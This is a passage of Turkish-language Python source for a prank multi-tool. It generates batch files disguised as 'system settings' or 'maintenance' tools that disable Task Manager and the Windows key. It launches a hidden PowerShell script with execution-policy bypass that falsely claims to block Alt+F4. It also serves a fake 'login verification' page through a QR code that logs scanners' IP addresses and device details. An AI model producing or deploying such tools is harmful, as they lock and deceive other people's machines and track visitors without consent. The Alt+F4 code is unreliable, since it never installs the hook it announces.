              "    reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoWinKeys /f >nul\n"
              "    echo Win tusu kilidi KALDIRILDI.\n"
              ") else (\n"
              "    reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoWinKeys /t REG_DWORD /d 1 /f >nul\n"
              "    echo Win tusu KITLENDI.\n"
              ")\n"
              "timeout /t 2 >nul\n",
              "Win tusu kilitle/kaldir toggle BAT"),

        "2": ("ag_ayar.bat",
              "@echo off\n"
              "title Sistem Ayari\n"
              "set PS=%TEMP%\\kbcfg2.ps1\n"
              "(\n"
              "echo Add-Type -TypeDefinition @'\n"
              "echo using System; using System.Runtime.InteropServices;\n"
              "echo public class KH { [DllImport(\"user32.dll\")] public static extern IntPtr SetWindowsHookEx(int id,IntPtr fn,IntPtr mod,uint tid); }\n"
              "echo '@\n"
              "echo Write-Host 'Alt+F4 engellendi. Kapatmak icin gorev yoneticisini kullanin.'\n"
              "echo Start-Sleep -Seconds 60\n"
              ") > \"%PS%\"\n"
              "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%PS%\"\n"
              "del \"%PS%\" >nul 2>&1\n",
              "60 saniye Alt+F4 engeller"),

        "3": ("guvenlik_ayar.bat",
              "@echo off\n"
              "title Sistem Ayari\n"
              "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr >nul 2>&1\n"
              "if %errorlevel%==0 (\n"
              "    reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /f >nul\n"
              "    echo Gorev Yoneticisi kilidi KALDIRILDI.\n"
              ") else (\n"
              "    reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul\n"
              "    echo Gorev Yoneticisi KITLENDI.\n"
              ")\n"
              "timeout /t 2 >nul\n",
              "Gorev yoneticisi kilitle/kaldir toggle BAT"),

        "4": ("bakim_araci.bat",
              "@echo off\n"
              "title Sistem Bakim Araci\n"
              "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoWinKeys /t REG_DWORD /d 1 /f >nul\n"
              "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul\n"
              "echo Tum ozel tuslar kitlendi.\n"
              "timeout /t 2 >nul\n",
              "Win tusu + Gorev Yoneticisi kitlenir"),

        "5": ("kilit_kaldir.bat",
              "@echo off\n"
              "title Kilit Kaldir\n"
              "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoWinKeys /f >nul 2>&1\n"
              "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /f >nul 2>&1\n"
              "echo Tum klavye kilitleri kaldirildi.\n"
              "timeout /t 2 >nul\n",
              "Her seyi normale dondurur"),
    }

    if s not in bat_icerik:
        warn("Gecersiz secim."); time.sleep(0.8); return

    dosya, icerik, aciklama = bat_icerik[s]
    spin("BAT dosyasi olusturuluyor", 1.0)
    _bat_yaz(dosya, icerik, aciklama)
    pause()



# ════════════════════════════════════════════════
#  22. IPv6 YÖNETİMİ
# ════════════════════════════════════════════════
def menu_ipv6():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return

    # Mevcut durumu göster
    def ipv6_durum():
        try:
            out = subprocess.check_output(
                ["powershell", "-Command",
                 "Get-NetAdapterBinding -ComponentID ms_tcpip6 | Select-Object Name,Enabled | Format-Table -AutoSize"],
                stderr=subprocess.DEVNULL, encoding="utf-8", errors="replace"
            )
            return out.strip()
        except:
            return "Durum alinamadi."

    print(f"  {DGREEN}IPv6 acik oldugunda gercek konumunuz ve kimliginiz sizip cikabilir.{R}\n")
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}IPv6 Durumunu Goster{R}       {DGREEN}Hangi adaptorler aktif?{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}IPv6 Kapat (Tum Adaptorler){R} {DGREEN}Gizlilik icin devre disi{R}")
    print(f"  {GREEN}[3]{R}  {BOLD}{GREEN}IPv6 Ac (Tum Adaptorler){R}   {DGREEN}Normale dondur{R}")
    print(f"  {GREEN}[4]{R}  {BOLD}{GREEN}IPv6 Registry Kilitle{R}      {DGREEN}Yeniden baslatmaya dayanikli kapat{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0":
        return

    elif s == "1":
        spin("IPv6 durumu kontrol ediliyor", 1.5)
        durum = ipv6_durum()
        print(f"\n{GREEN}{durum}{R}")
        thick()
        pause()

    elif s == "2":
        if not confirm("Tum adaptorler icin IPv6 kapatilsin mi?"):
            return
        spin("IPv6 kapatiliyor", 2)
        try:
            # Tüm adaptörler için kapat
            subprocess.run(
                ["powershell", "-Command",
                 "Get-NetAdapter | ForEach-Object { Disable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue }"],
                stderr=subprocess.DEVNULL
            )
            # Loopback dahil
            subprocess.run(
                ["powershell", "-Command",
                 "Disable-NetAdapterBinding -Name '*' -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue"],
                stderr=subprocess.DEVNULL
            )
            thick()
            success("IPv6 tum adaptorler icin kapatildi.")
            info("Degisiklik hemen gecerli olur, yeniden baslatma gerekmez.")
        except Exception as e:
            error(f"Hata: {e} — Yonetici yetkisiyle calistirin.")
        pause()

    elif s == "3":
        if not confirm("IPv6 tum adaptorler icin acilsin mi?"):
            return
        spin("IPv6 aktif ediliyor", 1.5)
        try:
            subprocess.run(
                ["powershell", "-Command",
                 "Get-NetAdapter | ForEach-Object { Enable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue }"],
                stderr=subprocess.DEVNULL
            )
            thick()
            success("IPv6 tum adaptorler icin acildi.")
        except Exception as e:
            error(f"Hata: {e}")
        pause()

    elif s == "4":
        if not confirm("Registry uzerinden IPv6 tamamen devre disi birakilsin mi?"):
            return
        spin("Registry IPv6 kilitleniyor", 2)
        try:
            # DisabledComponents 0xFF = tum IPv6 bilesenlerini kapat
            subprocess.run(
                ["powershell", "-Command",
                 r"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters' "
                 r"-Name 'DisabledComponents' -Value 0xFF -Type DWord -Force"],
                stderr=subprocess.DEVNULL
            )
            thick()
            success("Registry IPv6 kilidi uygulandı.")
            warn("Bu ayar yeniden baslatma sonrasi tam gecerli olur.")
            info("Geri almak icin: DisabledComponents degerini 0x00 yap.")
        except Exception as e:
            error(f"Hata: {e}")
        pause()

    else:
        warn("Gecersiz secim."); time.sleep(0.8)


# ════════════════════════════════════════════════
#  23. UYGULAMA GİZLİLİK AYARLARI
# ════════════════════════════════════════════════
def menu_gizlilik():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return

    def reg_kapat(yol, anahtar, deger=0):
        try:
            subprocess.run(
                ["powershell", "-Command",
                 f"Set-ItemProperty -Path '{yol}' -Name '{anahtar}' -Value {deger} -Type DWord -Force -ErrorAction Stop"],
                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL
            )
            return True
        except:
            return False

    def reg_oku(yol, anahtar):
        try:
            out = subprocess.check_output(
                ["powershell", "-Command",
                 f"(Get-ItemProperty -Path '{yol}' -Name '{anahtar}' -ErrorAction Stop).{anahtar}"],
                stderr=subprocess.DEVNULL, encoding="utf-8", errors="replace"
            ).strip()
            return out
        except:
            return "?"

    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}Kamera Erisimini Kapat{R}     {DGREEN}Tum uygulamalar icin{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}Mikrofon Erisimini Kapat{R}   {DGREEN}Tum uygulamalar icin{R}")
    print(f"  {GREEN}[3]{R}  {BOLD}{GREEN}Konum Servisini Kapat{R}      {DGREEN}GPS / ag konumu{R}")
    print(f"  {GREEN}[4]{R}  {BOLD}{GREEN}Bildirim Erisimini Kapat{R}   {DGREEN}Uygulama bildirimleri{R}")
    print(f"  {GREEN}[5]{R}  {BOLD}{GREEN}Reklam ID Sifirla & Kapat{R}  {DGREEN}Kisisellestirme izleme{R}")
    print(f"  {GREEN}[6]{R}  {BOLD}{GREEN}Aktivite Gecmisini Kapat{R}   {DGREEN}Timeline / ne yaptigin{R}")
    print(f"  {GREEN}[7]{R}  {BOLD}{GREEN}Gizlilik Durumunu Goster{R}   {DGREEN}Mevcut ayarlar neler?{R}")
    print(f"  {GREEN}[8]{R}  {BOLD}{GREEN}HEPSINI KAPAT{R}              {DGREEN}Tek tusla tam gizlilik{R}")
    print(f"  {GREEN}[9]{R}  {BOLD}{GREEN}Normele Dondur{R}             {DGREEN}Tum gizlilik ayarlarini sifirla{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0":
        return

    AYARLAR = {
        "kamera":    (r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",        "Value", "Deny"),
        "mikrofon":  (r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone",    "Value", "Deny"),
        "konum":     (r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",      "Value", "Deny"),
        "bildirim":  (r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener", "Value", "Deny"),
    }

    def cap_kapat(cap_yol, deger="Deny"):
        try:
            subprocess.run(
                ["powershell", "-Command",
                 f"Set-ItemProperty -Path '{cap_yol}' -Name 'Value' -Value '{deger}' -Force -ErrorAction Stop"],
                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL
            )
            return True
        except:
            return False

    def reklam_kapat():
        try:
            subprocess.run(["powershell","-Command",
                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\AdvertisingInfo' -Name 'Enabled' -Value 0 -Type DWord -Force"],
                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            return True
        except: return False

    if s in ("1","8"):
        spin("Kamera erisimi kapatiliyor", 1)
        ok = cap_kapat(AYARLAR["kamera"][0])
        success("Kamera erisimi kapatildi.") if ok else error("Kamera kapatılamadi (yonetici yetkisi gerekebilir).")

    if s in ("2","8"):
        spin("Mikrofon erisimi kapatiliyor", 1)
        ok = cap_kapat(AYARLAR["mikrofon"][0])
        success("Mikrofon erisimi kapatildi.") if ok else error("Mikrofon kapatılamadi.")

    if s in ("3","8"):
        spin("Konum servisi kapatiliyor", 1)
        ok = cap_kapat(AYARLAR["konum"][0])
        # Ek konum servisi
        subprocess.run(["powershell","-Command",
            "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\lfsvc\\Service\\Configuration' -Name 'Status' -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue"],
            stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        success("Konum servisi kapatildi.") if ok else error("Konum kapatılamadi.")

    if s in ("4","8"):
        spin("Bildirim erisimi kapatiliyor", 1)
        ok = cap_kapat(AYARLAR["bildirim"][0])
        success("Bildirim erisimi kapatildi.") if ok else error("Bildirim kapatılamadi.")

    if s in ("5","8"):
        spin("Reklam ID sifirlanip kapatiliyor", 1)
        ok = reklam_kapat()
        success("Reklam ID kapatildi.") if ok else error("Reklam ID kapatılamadi.")

    if s in ("6","8"):
        spin("Aktivite gecmisi kapatiliyor", 1)
        try:
            subprocess.run(["powershell","-Command",
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name 'EnableActivityFeed' -Value 0 -Type DWord -Force;"
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name 'PublishUserActivities' -Value 0 -Type DWord -Force;"
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name 'UploadUserActivities' -Value 0 -Type DWord -Force"],
                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            success("Aktivite gecmisi kapatildi.")
        except: error("Aktivite gecmisi kapatılamadi.")

    if s == "7":
        spin("Gizlilik durumu okunuyor", 1.5)
        print(); thick()
        kontroller = [
            ("Kamera",   r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",     "Value"),
            ("Mikrofon", r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone", "Value"),
            ("Konum",    r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",   "Value"),
        ]
        for isim, yol, anahtar in kontroller:
            try:
                out = subprocess.check_output(
                    ["powershell", "-Command", f"(Get-ItemProperty -Path '{yol}' -ErrorAction Stop).Value"],
                    stderr=subprocess.DEVNULL, encoding="utf-8", errors="replace"
                ).strip()
                renk = GREEN if out == "Deny" else RED
                durum = "KAPALI" if out == "Deny" else "ACIK"
                lv(f"  {isim}", durum, lc=DGREEN, vc=renk)
            except:
                lv(f"  {isim}", "Okunamadi", lc=DGREEN, vc=GRAY)
        # Reklam ID
        try:
            out = subprocess.check_output(
                ["powershell", "-Command",
                 r"(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo' -ErrorAction Stop).Enabled"],
                stderr=subprocess.DEVNULL, encoding="utf-8", errors="replace"
            ).strip()
            renk = GREEN if out == "0" else RED
            lv("  Reklam ID", "KAPALI" if out=="0" else "ACIK", lc=DGREEN, vc=renk)
        except:
            lv("  Reklam ID", "Okunamadi", lc=DGREEN, vc=GRAY)
        thick()

    if s == "9":
        if not confirm("Tum gizlilik ayarlari varsayilana donecek, emin misin?"):
            return
        spin("Ayarlar sifirlanıyor", 2)
        for _, yol, _ in [
            ("k", r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",     "Value"),
            ("m", r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone", "Value"),
            ("l", r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",   "Value"),
        ]:
            subprocess.run(["powershell","-Command",
                f"Set-ItemProperty -Path '{yol}' -Name 'Value' -Value 'Allow' -Force -ErrorAction SilentlyContinue"],
                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        subprocess.run(["powershell","-Command",
            "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\AdvertisingInfo' -Name 'Enabled' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue"],
            stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        success("Tum gizlilik ayarlari varsayilana donduruldu.")

    if s not in ("0","1","2","3","4","5","6","7","8","9"):
        warn("Gecersiz secim."); time.sleep(0.8); return

    if s != "7":
        pause()


# ════════════════════════════════════════════════
#  24. MOBİL QR ÜRETİCİ
# ════════════════════════════════════════════════
def menu_mobil_qr():
    banner("MOBIL QR URETICI", "Telefonla taranabilir QR kodlari")
    print(f"  {DGREEN}QR kodu terminalde ASCII olarak gosterilir, telefonla okuyabilirsin.{R}\n")
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}Link QR{R}                   {DGREEN}URL'yi telefona gonder{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}WiFi QR{R}                   {DGREEN}Telefon tarar, WiFi'ye baglanir{R}")
    print(f"  {GREEN}[3]{R}  {BOLD}{GREEN}Metin / Mesaj QR{R}          {DGREEN}Herhangi bir metni gonder{R}")
    print(f"  {GREEN}[4]{R}  {BOLD}{GREEN}Sahte QR Sahnesi{R}          {DGREEN}Tehlikeli site gibi gorünen QR{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0":
        return

    # qrcode kütüphanesi olmadan küçük QR oluşturan fonksiyon
    def qr_ascii(veri):
        try:
            import qrcode
            qr = qrcode.QRCode(border=1)
            qr.add_data(veri)
            qr.make(fit=True)
            matrix = qr.get_matrix()
            print()
            for row in matrix:
                satir = ""
                for cell in row:
                    satir += "██" if cell else "  "
                print(f"  {GREEN}{satir}{R}")
            print()
            return True
        except ImportError:
            # qrcode yoksa pip ile yükle
            info("qrcode modulu yukleniyor...")
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", "qrcode", "--quiet"],
                               stderr=subprocess.DEVNULL)
                import qrcode
                qr = qrcode.QRCode(border=1)
                qr.add_data(veri)
                qr.make(fit=True)
                matrix = qr.get_matrix()
                print()
                for row in matrix:
                    satir = ""
                    for cell in row:
                        satir += "██" if cell else "  "
                    print(f"  {GREEN}{satir}{R}")
                print()
                return True
            except Exception as e:
                error(f"QR olusturulamadi: {e}")
                return False

    if s == "1":
        print(f"\n  {GREEN}URL girin (ornek: https://google.com):{R}  ", end="")
        url = input().strip()
        if not url:
            warn("URL bos olamaz."); time.sleep(0.8); return
        if not url.startswith("http"):
            url = "https://" + url
        spin("QR olusturuluyor", 1)
        thick()
        info(f"Veri: {url}")
        qr_ascii(url)
        success("QR olusturuldu. Telefonunla tara!")
        pause()

    elif s == "2":
        print(f"\n  {GREEN}WiFi Agi Adi (SSID):{R}  ", end=""); ssid = input().strip()
        print(f"  {GREEN}WiFi Sifresi:{R}  ", end=""); pw = input().strip()
        print(f"  {GREEN}Guvenlik tipi (WPA/WEP/nopass) [WPA]:{R}  ", end="")
        tip = input().strip().upper() or "WPA"
        # WiFi QR formatı
        wifi_str = f"WIFI:T:{tip};S:{ssid};P:{pw};;"
        spin("WiFi QR olusturuluyor", 1)
        thick()
        info(f"Ag: {ssid}  |  Guvenlik: {tip}")
        qr_ascii(wifi_str)
        success("Telefon bu QR'i tarayinca otomatik WiFi'ye baglanir!")
        pause()

    elif s == "3":
        print(f"\n  {GREEN}Gondermek istedigin metin:{R}  ", end="")
        metin = input().strip()
        if not metin:
            warn("Metin bos olamaz."); time.sleep(0.8); return
        spin("QR olusturuluyor", 1)
        thick()
        qr_ascii(metin)
        success("QR olusturuldu!")
        pause()

    elif s == "4":
        print(f"\n  {GREEN}Gercek hedef URL (gizli kalacak):{R}  ", end="")
        gercek = input().strip()
        if not gercek.startswith("http"):
            gercek = "https://" + gercek
        # Sahte tehlikeli görünen ama aslında normal link olan QR
        print(f"\n  {DGREEN}QR kodu olusturuluyor — gercek link: {gercek}{R}")
        spin("QR olusturuluyor", 1)
        thick()
        print(f"  {RED}[!] Bu QR tehlikeli gorunuyor ama aslinda senin sectigin linke gidiyor{R}\n")
        qr_ascii(gercek)
        success("Sahte QR sahnesi hazirlandi!")
        pause()

    else:
        warn("Gecersiz secim."); time.sleep(0.8)




def ua_parse(ua):
    import re as _re
    cihaz="Bilinmiyor"; os_="Bilinmiyor"; br_="Bilinmiyor"

    # ── Samsung model kodu tablosu ──
    SAMSUNG_MODELLER = {
        "SM-S928":"Samsung Galaxy S24 Ultra","SM-S926":"Samsung Galaxy S24+","SM-S921":"Samsung Galaxy S24",
        "SM-S918":"Samsung Galaxy S23 Ultra","SM-S916":"Samsung Galaxy S23+","SM-S911":"Samsung Galaxy S23",
        "SM-S908":"Samsung Galaxy S22 Ultra","SM-S906":"Samsung Galaxy S22+","SM-S901":"Samsung Galaxy S22",
        "SM-G998":"Samsung Galaxy S21 Ultra","SM-G996":"Samsung Galaxy S21+","SM-G991":"Samsung Galaxy S21",
        "SM-G988":"Samsung Galaxy S20 Ultra","SM-G986":"Samsung Galaxy S20+","SM-G981":"Samsung Galaxy S20",
        "SM-G975":"Samsung Galaxy S10+","SM-G973":"Samsung Galaxy S10","SM-G970":"Samsung Galaxy S10e",
        "SM-A556":"Samsung Galaxy A55","SM-A546":"Samsung Galaxy A54","SM-A536":"Samsung Galaxy A53",
        "SM-A526":"Samsung Galaxy A52s","SM-A525":"Samsung Galaxy A52","SM-A515":"Samsung Galaxy A51",
        "SM-A346":"Samsung Galaxy A34","SM-A336":"Samsung Galaxy A33","SM-A325":"Samsung Galaxy A32",
        "SM-A256":"Samsung Galaxy A25","SM-A246":"Samsung Galaxy A24","SM-A235":"Samsung Galaxy A23",
        "SM-A156":"Samsung Galaxy A15","SM-A146":"Samsung Galaxy A14","SM-A135":"Samsung Galaxy A13",
        "SM-N986":"Samsung Galaxy Note 20 Ultra","SM-N981":"Samsung Galaxy Note 20",
        "SM-F946":"Samsung Galaxy Z Fold 5","SM-F731":"Samsung Galaxy Z Flip 5",
        "SM-F936":"Samsung Galaxy Z Fold 4","SM-F721":"Samsung Galaxy Z Flip 4",
    }
    IPHONE_MODELLER = {
        "iPhone17,2":"iPhone 16 Pro Max","iPhone17,1":"iPhone 16 Pro",
        "iPhone17,4":"iPhone 16 Plus","iPhone17,3":"iPhone 16",
        "iPhone16,2":"iPhone 15 Pro Max","iPhone16,1":"iPhone 15 Pro",
        "iPhone15,5":"iPhone 15 Plus","iPhone15,4":"iPhone 15",
        "iPhone15,3":"iPhone 14 Pro Max","iPhone15,2":"iPhone 14 Pro",
        "iPhone14,8":"iPhone 14 Plus","iPhone14,7":"iPhone 14",
        "iPhone14,5":"iPhone 13","iPhone14,4":"iPhone 13 Mini",
        "iPhone14,3":"iPhone 13 Pro Max","iPhone14,2":"iPhone 13 Pro",
        "iPhone13,4":"iPhone 12 Pro Max","iPhone13,3":"iPhone 12 Pro",
        "iPhone13,2":"iPhone 12","iPhone13,1":"iPhone 12 Mini",
        "iPhone12,5":"iPhone 11 Pro Max","iPhone12,3":"iPhone 11 Pro","iPhone12,1":"iPhone 11",
        "iPhone11,8":"iPhone XR","iPhone11,6":"iPhone XS Max","iPhone11,2":"iPhone XS",
    }

    # iPhone model kodu
    m_ip = _re.search(r"iPhone(\d+,\d+)", ua)
    if m_ip:
        kod = "iPhone" + m_ip.group(1)
        cihaz = IPHONE_MODELLER.get(kod, "Apple iPhone")
    elif "iPad" in ua:
        cihaz = "Apple iPad"
    # Samsung SM- kodu
    elif "SM-" in ua:
        m_sm = _re.search(r"SM-([A-Z][0-9]{3}[A-Z0-9]*)", ua)
        if m_sm:
            tam = "SM-" + m_sm.group(1)
            bulundu = None
            for k, v in SAMSUNG_MODELLER.items():
                if tam.startswith(k):
                    bulundu = v; break
            cihaz = bulundu if bulundu else f"Samsung Galaxy ({m_sm.group(1)})"
        else:
            cihaz = "Samsung Galaxy"
    # Xiaomi / Redmi / POCO — model adını UA'dan çek
    elif any(x in ua for x in ["Xiaomi","Redmi","POCO"]):
        m_xi = _re.search(r"(?:Xiaomi|Redmi|POCO)\s([A-Za-z0-9 _]+?)(?:\s+Build|;|\))", ua)
        if m_xi:
            marka = "Redmi" if "Redmi" in ua else ("POCO" if "POCO" in ua else "Xiaomi")
            cihaz = f"Xiaomi {m_xi.group(1).strip()}"
        else:
            cihaz = "Xiaomi"
    # Huawei
    elif "Huawei" in ua or "HUAWEI" in ua:
        m_hw = _re.search(r"(?:HUAWEI|Huawei)\s([A-Za-z0-9-]+)", ua)
        cihaz = f"Huawei {m_hw.group(1)}" if m_hw else "Huawei"
    # OPPO
    elif "OPPO" in ua:
        m_op = _re.search(r"OPPO\s?([A-Za-z0-9]+)", ua)
        cihaz = f"OPPO {m_op.group(1)}" if m_op else "OPPO"
    # vivo
    elif "vivo" in ua:
        m_vi = _re.search(r"vivo\s?([A-Za-z0-9]+)", ua)
        cihaz = f"Vivo {m_vi.group(1)}" if m_vi else "Vivo"
    # realme
    elif "realme" in ua:
        m_rl = _re.search(r"realme\s([A-Za-z0-9 ]+?)(?:\s+Build|;|\))", ua)
        cihaz = f"Realme {m_rl.group(1).strip()}" if m_rl else "Realme"
    # OnePlus
    elif "OnePlus" in ua:
        m_op2 = _re.search(r"OnePlus\s?([A-Za-z0-9]+)", ua)
        cihaz = f"OnePlus {m_op2.group(1)}" if m_op2 else "OnePlus"
    # Motorola
    elif "Motorola" in ua or "moto " in ua.lower():
        m_mo = _re.search(r"[Mm]oto\s([A-Za-z0-9 ]+?)(?:\s+Build|;|\))", ua)
        cihaz = f"Motorola Moto {m_mo.group(1).strip()}" if m_mo else "Motorola"
    # Sony
    elif "Sony" in ua:
        m_so = _re.search(r"Sony\s([A-Za-z0-9]+)", ua)
        cihaz = f"Sony {m_so.group(1)}" if m_so else "Sony Xperia"
    # Generic Android — Build/ öncesinden model çek
    elif "Android" in ua:
        m_gen = _re.search(r";\s*([A-Za-z0-9 _-]{4,30})\s+Build/", ua)
        cihaz = m_gen.group(1).strip() if m_gen else "Android Cihaz"
    elif "Windows" in ua: cihaz = "Windows PC"
    elif "Macintosh" in ua: cihaz = "Apple Mac"
    elif "Linux" in ua: cihaz = "Linux"

    # OS
    m = _re.search(r"iPhone OS ([\d_]+)", ua)
    if m: os_ = "iOS " + m.group(1).replace("_",".")
    else:
        m = _re.search(r"Android ([\d.]+)", ua)
        if m: os_ = "Android " + m.group(1)
        else:
            m = _re.search(r"Windows NT ([\d.]+)", ua)
            if m:
                nt = {"10.0":"Windows 10/11","6.3":"Win 8.1","6.1":"Win 7"}
                os_ = nt.get(m.group(1), "Windows NT " + m.group(1))
            elif "Mac OS X" in ua:
                m2 = _re.search(r"Mac OS X ([\d_]+)", ua)
                os_ = "macOS " + (m2.group(1).replace("_",".") if m2 else "")

    # Tarayici
    if   "CriOS"          in ua: br_ = "Chrome (iOS)"
    elif "FxiOS"          in ua: br_ = "Firefox (iOS)"
    elif "EdgA"           in ua: br_ = "Edge (Android)"
    elif "Edg/"           in ua: br_ = "Microsoft Edge"
    elif "OPR/"           in ua: br_ = "Opera"
    elif "SamsungBrowser" in ua: br_ = "Samsung Internet"
    elif "Chrome"         in ua: br_ = "Google Chrome"
    elif "Firefox"        in ua: br_ = "Mozilla Firefox"
    elif "Safari" in ua and "Chrome" not in ua: br_ = "Apple Safari"
    return cihaz, os_, br_


# ════════════════════════════════════════════════
#  25. QR CİHAZ TESPİTİ
# ════════════════════════════════════════════════
def menu_qr_cihaz():
    banner("QR CIHAZ TESPITI", "Telefon tarar, cihaz bilgisi gosterilir")
    print(f"  {DGREEN}Telefon QR'i tarayinca korkutucu bir 'tespit edildi' sayfasi acar.{R}")
    print(f"  {DGREEN}Aslinda sadece tarayici bilgisi ve IP gosterilir — tamamen zararsiz.{R}\n")
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}Yerel Ag (Ayni WiFi){R}      {DGREEN}Hizli, hic kurulum gerekmez{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}Internet (Cloudflare){R}     {DGREEN}Token yok, hesap yok, otomatik{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0":
        return
    if s not in ("1","2"):
        warn("Gecersiz secim."); time.sleep(0.8); return

    # qrcode kontrolü — tek gerekli modül
    try:
        import qrcode as qrlib
    except ImportError:
        info("qrcode modulu yukleniyor...")
        subprocess.run([sys.executable,"-m","pip","install","qrcode","--quiet"],
                       stderr=subprocess.DEVNULL)
        try:
            import qrcode as qrlib
        except:
            error("qrcode yuklenemedi."); pause(); return

    import threading, socket, re
    from http.server import HTTPServer, BaseHTTPRequestHandler

    PORT     = 5757
    import threading as _th
    ziyaret     = []
    ziyaret_lock = _th.Lock()
    gorulmus_ip  = set()

    # ── HTML şaka sayfası ──────────────────────────
    SAKA_HTML = """<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Giris Dogrulamasi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:Arial,sans-serif;
     display:flex;flex-direction:column;align-items:center;
     min-height:100vh;padding:16px}
h1{color:#58a6ff;font-size:1.1em;margin:20px 0 6px;text-align:center}
.card{border:1px solid #30363d;background:#161b22;border-radius:8px;
      padding:20px;width:100%;max-width:420px;margin:10px 0;text-align:center}
.card h2{color:#58a6ff;font-size:.95em;margin-bottom:10px}
.card p{color:#8b949e;font-size:.83em;line-height:1.7;margin-bottom:14px}
.btn{background:#238636;color:#fff;border:none;border-radius:6px;
     padding:12px;font-size:.95em;font-weight:bold;cursor:pointer;
     width:100%;font-family:Arial,sans-serif}
.btn:hover{background:#2ea043}
.btn:disabled{opacity:.6;cursor:not-allowed}
.status{font-size:.78em;color:#8b949e;margin-top:8px;min-height:18px}
.row{border:1px solid #21262d;border-radius:6px;padding:9px 12px;
     margin:5px 0;width:100%;max-width:420px;text-align:left}
.lbl{color:#8b949e;font-size:.63em;text-transform:uppercase;letter-spacing:1px}
.val{color:#c9d1d9;font-size:.88em;word-break:break-all}
.red{color:#f85149}.blue{color:#58a6ff}.orange{color:#d29922}.green{color:#3fb950}
.sep{width:100%;max-width:420px;border:none;border-top:1px solid #21262d;margin:6px 0}
#info{display:none;flex-direction:column;align-items:center;width:100%;max-width:420px}
.prog-wrap{width:100%;max-width:420px;height:3px;background:#21262d;
            border-radius:2px;margin-top:14px;overflow:hidden}
